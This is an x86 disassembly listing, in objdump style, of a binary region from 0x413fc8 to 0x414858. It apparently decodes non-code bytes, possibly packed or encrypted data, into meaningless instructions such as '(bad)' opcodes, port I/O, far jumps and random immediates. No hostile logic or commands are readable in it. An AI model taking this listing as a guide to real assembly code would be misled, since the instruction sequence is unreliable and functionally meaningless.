  413fc8:	sbb    eax,eax
  413fca:	les    ebx,FWORD PTR [ebp-0x672dd3c]
  413fd0:	cld    
  413fd1:	xchg   ecx,eax
  413fd3:	cmp    eax,0x1b918f36
  413fd8:	hlt    
  413fd9:	or     dl,BYTE PTR [esi-0x31]
  413fdc:	fld    TBYTE PTR [edx]
  413fde:	lds    eax,FWORD PTR [ebx+eiz*1+0x18]
  413fe2:	jmp    0x362d:0x4641e3ab
  413fe9:	mov    DWORD PTR [ebx-0x2b],ebx
  413fec:	xchg   esp,eax
  413fed:	jne    0x413f88
  413fef:	(bad)  
  413ff0:	sub    edx,ecx
  413ff2:	sbb    al,0x1a
  413ff4:	aas    
  413ff5:	gs in  al,dx
  413ff7:	inc    esp
  413ff8:	in     eax,0xbf
  413ffa:	cwde   
  413ffb:	lods   eax,DWORD PTR ds:[esi]
  413ffc:	jns    0x41406b
  413ffe:	mov    eax,cs
  414000:	sti    
  414001:	in     eax,0x38
  414003:	fwait
  414004:	call   0x524b:0x853a043d
  41400b:	fs (bad) 
  41400d:	shl    DWORD PTR [eax-0x14eed884],1
  414013:	ins    DWORD PTR es:[edi],dx
  414014:	pop    ebp
  414015:	outs   dx,DWORD PTR ds:[esi]
  414016:	ficomp DWORD PTR [ecx+0x5c36444a]
  41401c:	mov    edx,0x925c7b2a
  414021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414022:	push   0xb0eb9390
  414027:	jmp    0xca05:0x18eb8982
  41402e:	inc    ecx
  41402f:	xchg   esp,eax
  414030:	push   ecx
  414031:	xchg   ebx,eax
  414032:	xchg   ebp,eax
  414033:	or     ebx,DWORD PTR [eax+0x2b617f43]
  414039:	out    0xf3,al
  41403b:	dec    edi
  41403c:	jne    0x4140b2
  41403e:	clc    
  41403f:	adc    ecx,DWORD PTR [edi]
  414041:	(bad)  
  414042:	adc    al,0x3b
  414044:	sbb    BYTE PTR [ebp-0x7adde526],bl
  41404a:	aas    
  41404b:	add    ah,BYTE PTR [ebx]
  41404d:	mov    dl,0xc2
  41404f:	push   es
  414050:	sbb    ah,BYTE PTR [edx+edi*8-0x35]
  414054:	mov    dh,0x1b
  414056:	mov    ds,esi
  414058:	adc    esi,DWORD PTR [ecx-0x2c]
  41405b:	xchg   ebx,eax
  41405c:	shr    BYTE PTR [edx],0x48
  41405f:	int3   
  414060:	xchg   BYTE PTR [ecx-0x55],dl
  414063:	sub    DWORD PTR [esi-0x3a95ff8b],ebp
  414069:	dec    ecx
  41406a:	inc    eax
  41406b:	pop    ds
  41406c:	xlat   BYTE PTR ds:[ebx]
  41406d:	sbb    eax,0x1fd85308
  414072:	sahf   
  414073:	mov    eax,ds:0xb4afb6da
  414078:	mov    ecx,0xc1170141
  41407d:	pop    esi
  41407e:	stos   BYTE PTR es:[edi],al
  41407f:	adc    al,0x6
  414081:	loope  0x4140e1
  414083:	mov    ebx,0xbe0a3be8
  414088:	test   eax,0x3ecaea4c
  41408d:	adc    al,0xf1
  41408f:	fnstsw WORD PTR [ebx+edi*2]
  414092:	mov    ecx,0x9b7f47de
  414097:	mov    cl,cl
  414099:	jle    0x4140d9
  41409b:	and    BYTE PTR [eax],ah
  41409d:	xchg   ecx,eax
  41409e:	xor    al,0x77
  4140a0:	sbb    eax,0xfa0be775
  4140a5:	push   es
  4140a6:	add    BYTE PTR ss:[ebx],bh
  4140a9:	jbe    0x4140c5
  4140ab:	jg     0x4140d1
  4140ad:	in     al,0x5a
  4140af:	mov    ch,0xfe
  4140b1:	les    ebp,FWORD PTR [edx-0x52]
  4140b4:	popa   
  4140b5:	inc    esi
  4140b6:	hlt    
  4140b7:	pop    es
  4140b8:	in     al,dx
  4140b9:	xchg   edx,eax
  4140ba:	test   eax,0x4eb56b45
  4140bf:	sub    al,0x3c
  4140c1:	les    ecx,FWORD PTR [edx-0x6cfa7b24]
  4140c7:	mov    eax,0x1e7f2788
  4140cc:	xchg   edi,eax
  4140cd:	stos   DWORD PTR es:[edi],eax
  4140ce:	mov    al,0x30
  4140d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140d1:	lds    ecx,FWORD PTR [ecx-0x62966301]
  4140d7:	fcomp  QWORD PTR [edi]
  4140d9:	inc    esi
  4140da:	mov    ecx,edi
  4140dc:	mul    BYTE PTR [ebx]
  4140de:	sbb    DWORD PTR [edi],edi
  4140e0:	fcom   DWORD PTR [ebx+0x45]
  4140e3:	dec    ebx
  4140e4:	sbb    ch,BYTE PTR [esp+eiz*4+0x1d73a7e8]
  4140eb:	cdq    
  4140ec:	aad    0x3a
  4140ee:	push   0x5094ac94
  4140f3:	push   0x4
  4140f5:	pop    esi
  4140f6:	arpl   WORD PTR [esi],dx
  4140f8:	repz xchg edi,eax
  4140fa:	sub    edi,ebp
  4140fc:	xor    dh,BYTE PTR [ecx-0x1b]
  4140ff:	dec    esp
  414100:	or     BYTE PTR [eax+0x765ce70a],cl
  414106:	cli    
  414107:	adc    eax,DWORD PTR ds:0xfe9063d7
  41410d:	mov    esi,0x3b4b66c7
  414112:	pusha  
  414113:	jg     0x41413e
  414115:	jmp    0x30c3:0x5d091e62
  41411c:	dec    DWORD PTR [ecx]
  41411e:	sti    
  41411f:	sar    BYTE PTR [ebx],0x6d
  414122:	jnp    0x4140f5
  414124:	jnp    0x4140ee
  414126:	imul   edi,esp,0x78
  414129:	push   ds
  41412a:	xor    DWORD PTR [eax-0x29],esp
  41412d:	popf   
  41412e:	div    BYTE PTR [ebx+0x61135551]
  414134:	inc    eax
  414135:	pop    eax
  414136:	popa   
  414137:	shl    BYTE PTR [edi+0x3fa0b51],1
  41413d:	dec    esi
  41413e:	addr16 xchg esp,eax
  414140:	add    al,BYTE PTR [esp+esi*8-0x2b]
  414144:	push   cs
  414145:	dec    edx
  414146:	(bad)  
  414147:	fimul  WORD PTR [ecx+0x23207b39]
  41414d:	cmp    eax,0xd360ce19
  414152:	jp     0x41413a
  414154:	fadd   DWORD PTR [ebx-0x7e]
  414157:	sbb    al,0xb7
  414159:	inc    ecx
  41415a:	and    edx,eax
  41415c:	lods   al,BYTE PTR ds:[esi]
  41415d:	or     esp,DWORD PTR gs:[edx-0x1e]
  414161:	aad    0xdc
  414163:	push   ds
  414164:	sub    BYTE PTR [edi-0x8],0x88
  414168:	sbb    cl,BYTE PTR [ebx-0x70]
  41416b:	xchg   edx,eax
  41416c:	sbb    dl,BYTE PTR ds:0x28e7724d
  414172:	addr16 cwde 
  414174:	int    0xd7
  414176:	sahf   
  414177:	or     ah,BYTE PTR [eax]
  414179:	out    dx,al
  41417a:	pop    esp
  41417b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41417c:	leave  
  41417d:	push   edi
  41417e:	imul   ebp,DWORD PTR [edi-0x40519a13],0x0
  414185:	push   edx
  414186:	mov    ah,0x1b
  414188:	aas    
  414189:	push   cs
  41418a:	cwde   
  41418b:	dec    esi
  41418c:	repnz push esi
  41418e:	repz and BYTE PTR ds:0x74308a99,dh
  414195:	sahf   
  414196:	aam    0x53
  414198:	sub    al,0x6a
  41419a:	pop    ebx
  41419b:	sub    BYTE PTR [ebx+0x1be37f4b],dh
  4141a1:	data16 (bad) 
  4141a3:	fsubr  DWORD PTR [ebp+0x4310b152]
  4141a9:	xor    al,BYTE PTR [edi-0x1bfe1132]
  4141af:	push   esi
  4141b0:	inc    eax
  4141b1:	push   esi
  4141b2:	arpl   WORD PTR [ebp+ebx*8-0x21ebed29],ax
  4141b9:	adc    al,0x70
  4141bb:	std    
  4141bc:	cwde   
  4141bd:	add    ch,BYTE PTR [edi-0x7d34865b]
  4141c3:	out    dx,eax
  4141c4:	jne    0x414220
  4141c6:	gs add al,0xeb
  4141c9:	adc    BYTE PTR [ebp+0x42e27768],dh
  4141cf:	pop    ebp
  4141d0:	or     eax,0xd94a8a76
  4141d5:	sub    bl,bh
  4141d7:	jmp    0x4141cd
  4141d9:	jo     0x4141e3
  4141db:	dec    esp
  4141dc:	into   
  4141dd:	leave  
  4141de:	popa   
  4141df:	pop    ebp
  4141e0:	ins    BYTE PTR es:[edi],dx
  4141e1:	or     dh,BYTE PTR [ebx+0x5c855bf0]
  4141e7:	imul   eax,ebp,0xa15912d3
  4141ed:	cmc    
  4141ee:	js     0x414217
  4141f0:	mov    edi,0xf9554a56
  4141f5:	or     eax,0x6225fc3c
  4141fa:	clc    
  4141fb:	cmc    
  4141fc:	std    
  4141fd:	hlt    
  4141fe:	push   edx
  4141ff:	and    DWORD PTR [ebx],0xffffff93
  414202:	mov    eax,ds:0xf1e31e22
  414207:	loope  0x4141c5
  414209:	in     eax,0xdd
  41420b:	jle    0x414240
  41420d:	lock dec esi
  41420f:	push   esp
  414210:	cmp    eax,0xca1d4ad2
  414215:	mov    edx,0x5cd21d8b
  41421a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41421b:	mov    dl,BYTE PTR ds:0x6b08bb81
  414221:	sbb    BYTE PTR [ebp-0x7e30ff8b],0x8d
  414228:	pop    ss
  414229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41422a:	inc    esi
  41422b:	popf   
  41422c:	ror    DWORD PTR [edi-0x1],1
  41422f:	aam    0x24
  414231:	popf   
  414232:	out    dx,eax
  414233:	loope  0x41421e
  414235:	jne    0x4142ab
  414237:	inc    ecx
  414238:	arpl   WORD PTR [edi+0x6f5d4455],sp
  41423e:	clc    
  41423f:	lock call 0x823f0469
  414245:	popa   
  414246:	inc    eax
  414247:	(bad)  
  414248:	addr16 xchg ecx,esi
  41424b:	jmp    0x4b70:0xf5ed0833
  414252:	rol    DWORD PTR [edx*8-0x95dc683],1
  414259:	shl    BYTE PTR [edx+0x75],1
  41425c:	add    al,0xaa
  41425e:	inc    ebp
  41425f:	push   edx
  414260:	pushf  
  414261:	add    al,0x48
  414263:	bnd ret 
  414265:	sub    BYTE PTR [edx+0x8],al
  414268:	pop    edx
  414269:	shl    DWORD PTR [edx-0x28],1
  41426c:	pop    ebp
  41426d:	adc    DWORD PTR [ebp+ebx*8-0x34605032],ecx
  414274:	enter  0xc804,0x34
  414278:	jbe    0x4142c2
  41427a:	(bad)  
  41427b:	(bad)  
  41427c:	mov    esp,0xfe02b6bd
  414281:	imul   esi,DWORD PTR [edx-0x79e112a9],0x335332fc
  41428b:	mov    dl,0xc0
  41428d:	jae    0x4142e9
  41428f:	(bad)  
  414290:	ins    BYTE PTR es:[edi],dx
  414291:	popf   
  414292:	(bad)  
  414293:	std    
  414294:	or     edx,DWORD PTR [ebx]
  414296:	jmp    DWORD PTR [ecx]
  414298:	cmp    eax,0x3822bdb6
  41429d:	add    eax,0xdca2b404
  4142a2:	mov    ch,0xf2
  4142a4:	sti    
  4142a5:	test   ch,dl
  4142a7:	mov    edx,0xbca1f7a5
  4142ac:	adc    dh,cl
  4142ae:	and    ebp,esi
  4142b0:	xchg   edx,eax
  4142b1:	loopne 0x414259
  4142b3:	mov    BYTE PTR [edi-0x4ae7de7e],bl
  4142b9:	sub    ebp,DWORD PTR [edx]
  4142bb:	push   esi
  4142bc:	mov    ebp,0x9a5fa7b1
  4142c1:	mov    ebp,0x30c0c7fb
  4142c6:	mov    ebp,edx
  4142c8:	jmp    0x4142f7
  4142ca:	fst    DWORD PTR [edi]
  4142cc:	mov    eax,ds:0x45b4b6f0
  4142d1:	or     al,0x1d
  4142d3:	gs mov ch,0x12
  4142d6:	lods   al,BYTE PTR ds:[esi]
  4142d7:	xlat   BYTE PTR gs:[ebx]
  4142d9:	fld    TBYTE PTR [eax]
  4142db:	jge    0x4142e7
  4142dd:	in     eax,dx
  4142de:	idiv   ebx
  4142e0:	sar    DWORD PTR [eax+esi*1-0x5c],1
  4142e4:	lods   al,BYTE PTR ds:[esi]
  4142e5:	pop    edi
  4142e6:	pushf  
  4142e7:	dec    edx
  4142e8:	push   ebp
  4142e9:	mov    eax,0x8c06a344
  4142ee:	cwde   
  4142ef:	icebp  
  4142f0:	xor    al,0x22
  4142f2:	pop    edx
  4142f3:	and    ah,BYTE PTR [ebp+0x5f]
  4142f6:	scas   eax,DWORD PTR es:[edi]
  4142f7:	imul   edx,eax,0xffffffd6
  4142fa:	adc    al,BYTE PTR [ecx]
  4142fc:	lahf   
  4142fd:	sbb    eax,0x20b74a7b
  414302:	test   BYTE PTR [edi],0x62
  414305:	js     0x41437f
  414307:	add    eax,0x7eeec8b1
  41430c:	sbb    al,0xac
  41430e:	jmp    0x9848:0x98056c5e
  414315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414316:	sub    cl,BYTE PTR [edi]
  414318:	sahf   
  414319:	and    eax,0x57980038
  41431e:	dec    esi
  41431f:	js     0x4142d8
  414321:	dec    ebx
  414322:	hlt    
  414323:	loopne 0x4142e4
  414325:	inc    ecx
  414326:	test   eax,0x2a82bee2
  41432b:	retf   0xbdef
  41432e:	pop    esp
  41432f:	xlat   BYTE PTR ds:[ebx]
  414330:	add    esp,DWORD PTR [edi+0x5a6da371]
  414336:	repnz ins BYTE PTR es:[edi],dx
  414338:	xor    eax,0xc16257a2
  41433d:	(bad)  
  41433e:	mov    ecx,0x175bf4ac
  414343:	shl    BYTE PTR [ebp-0xc],1
  414346:	fld    st(6)
  414348:	test   al,0x57
  41434a:	push   0x49
  41434c:	(bad)  
  41434d:	loope  0x41436f
  41434f:	pop    esi
  414350:	cmp    DWORD PTR ds:[esi-0x28],eax
  414354:	mov    ebx,0x9b3fd65
  414359:	sar    DWORD PTR [ebx],1
  41435b:	in     al,0x65
  41435d:	addr16 adc al,0x64
  414360:	xor    BYTE PTR [edi],bl
  414362:	cwde   
  414363:	fs icebp 
  414365:	aad    0x6c
  414367:	add    BYTE PTR [edi+0x5fd95a9e],0x2f
  41436e:	fwait
  41436f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414370:	sub    al,BYTE PTR [ebx+0x779fe3f1]
  414376:	xchg   ebp,eax
  414377:	xor    DWORD PTR [esi+0x45131b40],ebp
  41437d:	fs leave 
  41437f:	in     eax,dx
  414380:	fisttp WORD PTR [ebp+0x52]
  414383:	dec    ebx
  414384:	pop    ebp
  414385:	push   cs
  414386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414387:	mov    esp,0x96ee995
  41438c:	mov    dl,0x63
  41438e:	or     eax,0x8d351dff
  414393:	call   0x7533362c
  414398:	jnp    0x414380
  41439a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41439b:	gs push ebp
  41439d:	sbb    al,0x43
  41439f:	dec    ebp
  4143a0:	mov    ecx,0x9f9f8f52
  4143a5:	cmp    dl,BYTE PTR [esp+ebp*1]
  4143a8:	call   0xb6cd4687
  4143ad:	(bad)  
  4143ae:	loope  0x4143d1
  4143b0:	pusha  
  4143b1:	imul   ebp,DWORD PTR [edi-0x1a],0x787ec484
  4143b8:	pop    eax
  4143b9:	lock retf 
  4143bb:	daa    
  4143bc:	ins    DWORD PTR es:[edi],dx
  4143bd:	icebp  
  4143be:	icebp  
  4143bf:	mov    ecx,0x4fc95539
  4143c4:	xor    eax,0x72dcd09b
  4143c9:	jae    0x414428
  4143cb:	ret    0x95b7
  4143ce:	pop    edx
  4143cf:	adc    eax,DWORD PTR [edi+0x634edf15]
  4143d5:	cmp    DWORD PTR [ebx-0x76],eax
  4143d8:	fs push 0xffffffc6
  4143db:	les    ebp,FWORD PTR [ebx]
  4143dd:	or     BYTE PTR [ebx+0x6e9de888],ah
  4143e3:	mov    ebp,0x95a31396
  4143e8:	or     DWORD PTR [edi+0x5aeb0f75],edi
  4143ee:	jle    0x4143d8
  4143f0:	outs   dx,BYTE PTR ds:[esi]
  4143f1:	cwde   
  4143f2:	mov    cs,WORD PTR [edi+0x37afe34b]
  4143f8:	mov    ebx,0xdbbf8f2d
  4143fd:	outs   dx,DWORD PTR ds:[esi]
  4143fe:	test   al,0xaf
  414400:	jno    0x41442f
  414402:	cmp    DWORD PTR [edi],0x33c59d71
  414408:	pop    edi
  414409:	(bad)  
  41440b:	mov    ch,0xbc
  41440d:	jge    0x414412
  41440f:	xor    esp,edx
  414411:	cdq    
  414412:	pop    ds
  414413:	pop    edx
  414414:	push   es
  414415:	sbb    eax,0xf431d003
  41441a:	mov    ebp,DWORD PTR [esi]
  41441c:	data16 sahf 
  41441e:	int    0xe7
  414420:	xor    al,0x37
  414422:	sar    ebx,1
  414424:	stc    
  414425:	or     ebx,edx
  414427:	jnp    0x414434
  414429:	inc    edx
  41442a:	inc    ecx
  41442b:	xchg   edx,eax
  41442c:	mov    ebp,0x54e61b65
  414431:	dec    ebx
  414432:	add    DWORD PTR [ebx-0x67],edi
  414435:	mov    edx,0x1f2664b9
  41443a:	and    eax,0x165a93c9
  41443f:	pop    ss
  414440:	(bad)  
  414441:	js     0x4144b5
  414443:	mov    ds:0x3fe3addd,al
  414448:	jnp    0x4143ff
  41444a:	xor    edi,DWORD PTR [ebp-0x6e3b246]
  414450:	mov    ds:0x93870125,eax
  414455:	hlt    
  414456:	test   BYTE PTR ds:0xa022d249,bl
  41445c:	jb     0x414464
  41445e:	outs   dx,BYTE PTR ds:[esi]
  41445f:	shl    BYTE PTR [ebx-0x22],cl
  414462:	push   ecx
  414463:	xchg   edx,eax
  414464:	stos   DWORD PTR es:[edi],eax
  414465:	sub    DWORD PTR ds:0x83933f63,ebx
  41446b:	xchg   edi,eax
  41446c:	mov    edi,0x42bd4b8e
  414471:	loop   0x414467
  414473:	mov    al,ds:0x477b42dd
  414478:	mov    dh,0x88
  41447a:	aad    0xa3
  41447c:	lock pop ds
  41447e:	jnp    0x414486
  414480:	jg     0x4144a3
  414482:	jmp    0x414503
  414484:	inc    esi
  414485:	and    eax,0x6a19366f
  41448a:	add    al,0xa3
  41448c:	mov    dl,0x9d
  41448e:	push   ss
  41448f:	cdq    
  414490:	outs   dx,DWORD PTR ds:[esi]
  414491:	test   DWORD PTR [edi],0x17067aac
  414497:	push   0x0
	...
  414514:	in     al,dx
  414515:	ss ins BYTE PTR es:[edi],dx
  414517:	or     esi,edi
  414519:	pop    ebx
  41451a:	in     eax,dx
  41451b:	test   DWORD PTR [edi-0x26],0x2e209ed2
  414522:	in     al,0xae
  414524:	(bad)
  414527:	add    BYTE PTR [edi+eax*1+0x0],ch
  41452b:	add    bl,dl
  41452d:	push   edx
  41452e:	shl    DWORD PTR [edi+0x15],0x9b
  414532:	outs   dx,BYTE PTR ds:[esi]
  414533:	test   DWORD PTR [eax+0x5],0xa78b28e9
  41453a:	jge    0x4145ab
  41453c:	ret    0xe8a0
  41453f:	aam    0x7e
  414541:	jns    0x414534
  414543:	in     eax,0x80
  414545:	xchg   DWORD PTR [ecx-0x670a170c],edx
  41454b:	dec    esp
  41454c:	sub    cl,BYTE PTR [esi+0x27]
  41454f:	out    0x66,eax
  414551:	jecxz  0x414555
  414553:	hlt    
  414554:	jmp    0x64aa:0x69abb2e3
  41455b:	push   0xf8c773b2
  414560:	sub    BYTE PTR [esp+eax*8],bh
  414563:	stc    
  414564:	cmp    al,0xc3
  414566:	and    BYTE PTR [edx+0x338bb08a],bl
  41456c:	push   edx
  41456d:	test   eax,0x18e3bdf6
  414572:	sub    cl,0xb0
  414575:	loop   0x414579
  414577:	repz fs clc 
  41457a:	stos   BYTE PTR es:[edi],al
  41457b:	add    DWORD PTR [ebx],ebx
  41457d:	popa   
  41457e:	pop    ds
  41457f:	pop    ss
  414580:	xor    eax,0xdb07c430
  414585:	mov    edi,ebx
  414587:	jne    0x4145de
  414589:	cmc    
  41458a:	aad    0xe
  41458c:	mov    DWORD PTR [ebx+0x2c],edx
  41458f:	test   eax,0x165f494
  414594:	and    esi,esp
  414596:	mov    esp,0xf3a8de35
  41459b:	cmp    edx,DWORD PTR [ecx]
  41459d:	add    DWORD PTR ss:[ebx],edi
  4145a0:	outs   dx,DWORD PTR ds:[esi]
  4145a1:	mov    cl,0xf5
  4145a3:	add    BYTE PTR [eax],0x26
  4145a6:	add    BYTE PTR [edi+0x6d],al
  4145a9:	sub    edx,edi
  4145ab:	sar    BYTE PTR [ecx+0x6699809b],1
  4145b1:	jge    0x414542
  4145b3:	xchg   BYTE PTR [eax-0x4a6a41bf],bh
  4145b9:	sub    edi,edi
  4145bb:	jno    0x414635
  4145bd:	pop    eax
  4145be:	outs   dx,DWORD PTR ds:[esi]
  4145bf:	mov    edx,0x183ff82e
  4145c4:	mov    ds:0x530476dc,al
  4145c9:	das    
  4145ca:	sbb    eax,0x5c0df33b
  4145cf:	sbb    DWORD PTR [edi],ecx
  4145d1:	mov    ch,0xe7
  4145d3:	mov    ebx,0x613bed60
  4145d8:	or     eax,0x82b731da
  4145dd:	sbb    cl,BYTE PTR [edi+0x52]
  4145e0:	cmp    ah,BYTE PTR [ecx]
  4145e2:	xchg   edi,eax
  4145e3:	xor    ah,BYTE PTR ds:0x6310fcd2
  4145e9:	adc    BYTE PTR [eax+0x5a],ah
  4145ec:	jns    0x414592
  4145ee:	js     0x414660
  4145f0:	jmp    0x312d:0xc6566e46
  4145f7:	int    0x5a
  4145f9:	(bad)  
  4145fb:	xchg   esi,eax
  4145fc:	cs jmp eax
  4145ff:	xor    eax,0x1fdb65a0
  414604:	mov    cl,0x1a
  414606:	xchg   esp,eax
  414607:	or     bl,BYTE PTR [esi-0x74b6727a]
  41460d:	leave  
  41460e:	imul   edx,DWORD PTR [ebp+0x31],0xf1cecde1
  414615:	xor    dl,al
  414617:	lahf   
  414618:	test   DWORD PTR [eax-0x5ae9fcf],0x15a63545
  414622:	cwde   
  414623:	in     al,dx
  414624:	stc    
  414625:	sbb    BYTE PTR [esi],al
  414627:	dec    edx
  414628:	mov    cl,0x10
  41462a:	mov    cl,0x4e
  41462c:	dec    eax
  41462d:	mov    edi,0x3121ce8b
  414632:	(bad)  
  414633:	sbb    DWORD PTR [esi+0x48c0acb1],ebx
  414639:	xchg   esp,eax
  41463a:	inc    ebx
  41463b:	pushf  
  41463c:	or     esi,DWORD PTR [ebx-0x1c]
  41463f:	push   ebx
  414640:	adc    eax,0x1e4310c
  414645:	dec    eax
  414646:	aaa    
  414647:	aaa    
  414648:	loop   0x414613
  41464a:	sbb    ebp,DWORD PTR [eax]
  41464c:	int    0x5
  41464e:	jle    0x414634
  414650:	or     DWORD PTR [ecx],ecx
  414652:	fs into 
  414654:	sub    al,0x24
  414656:	pop    edx
  414657:	pop    esp
  414658:	sbb    DWORD PTR [edx+eax*4-0x1e],ecx
  41465c:	nop
  41465d:	(bad)  
  41465e:	outs   dx,BYTE PTR ds:[esi]
  41465f:	jb     0x414684
  414661:	or     al,0x5f
  414663:	shl    BYTE PTR [esi+0x294a01b2],cl
  414669:	int3   
  41466a:	outs   dx,BYTE PTR ds:[esi]
  41466b:	call   0xa96815a5
  414670:	sbb    eax,0xa88c5056
  414675:	push   0x3a172ed8
  41467a:	mov    edi,0x9dbab11a
  41467f:	lock shl BYTE PTR [edi+eiz*8+0x76294e24],0xc8
  414688:	and    al,0xb1
  41468a:	repnz aaa 
  41468c:	adc    al,0x78
  41468e:	iret   
  41468f:	repz xor eax,0x1eadf4e7
  414695:	lods   al,BYTE PTR ds:[esi]
  414696:	inc    esp
  414697:	mov    ds:0xd1de8f9c,eax
  41469c:	outs   dx,DWORD PTR ds:[esi]
  41469d:	sbb    edx,DWORD PTR [ecx]
  41469f:	add    ebx,DWORD PTR [edi]
  4146a1:	jge    0x4146da
  4146a3:	mov    ebp,0x59a400e3
  4146a8:	call   0x7f37dbbc
  4146ad:	inc    ecx
  4146ae:	sbb    al,0x76
  4146b0:	test   eax,0x64b071d3
  4146b5:	dec    ebx
  4146b6:	stc    
  4146b7:	or     al,0x56
  4146b9:	stos   DWORD PTR es:[edi],eax
  4146ba:	les    ebx,FWORD PTR [esp+edi*4+0x1823d696]
  4146c1:	(bad)  
  4146c2:	loop   0x4146ef
  4146c4:	adc    bh,BYTE PTR [ebp-0x2f346afe]
  4146ca:	popf   
  4146cb:	adc    dh,BYTE PTR [ecx+0x7bb8936a]
  4146d1:	mov    bh,0xba
  4146d3:	imul   ebx,ebx,0xfffffffe
  4146d6:	fimul  WORD PTR [eax+0x2f010d4d]
  4146dc:	sbb    DWORD PTR [eax+0x15],edi
  4146df:	xlat   BYTE PTR ds:[ebx]
  4146e0:	stc    
  4146e1:	push   esp
  4146e2:	mov    ecx,0x95683b80
  4146e7:	aas    
  4146e8:	sub    eax,0x25b42bc5
  4146ed:	add    al,0xb4
  4146ef:	xchg   ecx,eax
  4146f0:	pop    edi
  4146f1:	hlt    
  4146f2:	inc    ebx
  4146f3:	or     edx,DWORD PTR [edi-0x27746709]
  4146f9:	in     al,dx
  4146fa:	rol    DWORD PTR ds:0x20671a4e,0xf0
  414701:	jle    0x4146da
  414703:	jl     0x4146d4
  414705:	aam    0x59
  414707:	sbb    eax,0x386c5867
  41470c:	sub    DWORD PTR [esi],0x24
  41470f:	mov    esp,0xc0f01e1e
  414714:	mov    cl,0x39
  414716:	bound  ebx,QWORD PTR [ebp+0x2]
  414719:	inc    edx
  41471a:	lea    esi,[ebp-0xbf57f31]
  414720:	les    eax,FWORD PTR [esi]
  414722:	aam    0xfb
  414724:	jg     0x414733
  414726:	rol    eax,0x36
  414729:	sbb    ch,BYTE PTR fs:0xc6fecd4f
  414730:	push   ecx
  414731:	outs   dx,DWORD PTR ds:[esi]
  414732:	in     al,dx
  414733:	xor    al,0xb
  414735:	inc    esi
  414736:	mov    cl,0xb5
  414738:	pop    edx
  414739:	jno    0x4146c8
  41473b:	fnstenv [ebp-0x27]
  41473e:	jle    0x4146c1
  414740:	lds    edx,FWORD PTR [eax]
  414742:	cmp    ecx,edi
  414744:	imul   edi,DWORD PTR [ebp-0x21586f51],0x38
  41474b:	mov    ebx,0xc43a2098
  414750:	imul   ebx,ebp,0x866c3993
  414756:	xchg   edx,eax
  414757:	sub    bh,BYTE PTR [esi+0x2c]
  41475a:	in     al,dx
  41475b:	sub    DWORD PTR [ebx+0x1f0be7af],esi
  414761:	and    eax,0x8cadeafb
  414766:	jle    0x4146f4
  414768:	int    0x22
  41476a:	ror    DWORD PTR [eax-0x60],cl
  41476d:	dec    eax
  41476e:	push   ss
  41476f:	(bad)  
  414771:	push   ebx
  414772:	icebp  
  414773:	and    ch,BYTE PTR [ebx]
  414775:	scas   eax,DWORD PTR es:[edi]
  414776:	out    dx,eax
  414777:	mov    edi,0xa2d04d0c
  41477c:	jl     0x4147d0
  41477e:	sahf   
  41477f:	sbb    dl,al
  414781:	or     bh,bh
  414783:	xchg   edi,eax
  414784:	jnp    0x414710
  414786:	and    DWORD PTR [edi-0x7c],ecx
  414789:	das    
  41478a:	cs pop es
  41478c:	cmc    
  41478d:	test   DWORD PTR [ecx+0x10],ebx
  414790:	shl    DWORD PTR [esi+0x65],1
  414793:	inc    ecx
  414794:	inc    eax
  414795:	aad    0x46
  414797:	fs int 0x7a
  41479a:	pop    edx
  41479c:	inc    esp
  41479d:	jo     0x414737
  41479f:	outs   dx,DWORD PTR ds:[esi]
  4147a0:	vpmacsww xmm7,xmm4,xmm0,xmm1
  4147a6:	push   es
  4147a7:	xchg   esp,eax
  4147a8:	in     eax,dx
  4147a9:	and    eax,0xa0f0fe7e
  4147ae:	stos   BYTE PTR es:[edi],al
  4147af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147b0:	imul   esi,edi,0xd75ae8ad
  4147b6:	pop    esp
  4147b7:	int    0x2d
  4147b9:	or     al,0x5f
  4147bb:	push   ebx
  4147bc:	lea    ebx,[ebx]
  4147be:	push   esp
  4147bf:	arpl   WORD PTR [edi+0x3dae435a],bp
  4147c5:	(bad)  
  4147c7:	jecxz  0x41475f
  4147c9:	or     al,0x41
  4147cb:	pop    edx
  4147cc:	js     0x414835
  4147ce:	outs   dx,DWORD PTR ds:[esi]
  4147cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147d0:	pop    es
  4147d1:	neg    BYTE PTR [ebp-0x48]
  4147d4:	push   ebx
  4147d5:	sub    al,0x66
  4147d7:	or     eax,0x2d62610d
  4147dc:	fiadd  DWORD PTR [ebx+0x18]
  4147df:	mov    esi,0x3310950
  4147e4:	mov    cl,0xe2
  4147e6:	sahf   
  4147e7:	and    BYTE PTR [ebx],0xbb
  4147ea:	arpl   WORD PTR [ebp-0x7e],di
  4147ed:	xchg   BYTE PTR [esi],dh
  4147ef:	jnp    0x41479b
  4147f1:	fwait
  4147f2:	add    esp,ebp
  4147f4:	call   0x8247:0xcd07b8f4
  4147fb:	push   esi
  4147fc:	repnz adc BYTE PTR es:[eax-0x489f00b1],0x4d
  414805:	xchg   esi,eax
  414806:	jnp    0x4147ab
  414808:	jbe    0x414885
  41480a:	test   eax,0xc38cb26c
  41480f:	mov    bh,0x29
  414811:	mov    eax,0x44c41d00
  414816:	mov    bl,0x54
  414818:	pop    ecx
  414819:	or     DWORD PTR [ebx],esi
  41481b:	imul   esp,DWORD PTR [ecx+0x1b],0x84aacff4
  414822:	(bad)  
  414823:	fdiv   st(6),st
  414825:	push   0x5ab2378a
  41482a:	mov    BYTE PTR [ebp+0x7c],cl
  41482d:	jg     0x414872
  41482f:	shl    BYTE PTR [ebx-0x5c7037a0],cl
  414835:	sbb    ebp,DWORD PTR [ebp-0x361cfed9]
  41483b:	push   ebp
  41483c:	adc    al,BYTE PTR ds:0xa4fd
  414841:	and    ebp,0x1e4a5762
  414847:	rcr    BYTE PTR [eax-0x14],0x93
  41484b:	jbe    0x41483d
  41484d:	xchg   edx,eax
  41484e:	stc    
  41484f:	inc    ebp
  414850:	pop    ecx
  414851:	mov    es,edi
  414853:	test   eax,0xe23b9c5c
  414858:	mov    ds:0xc1bc611d,al
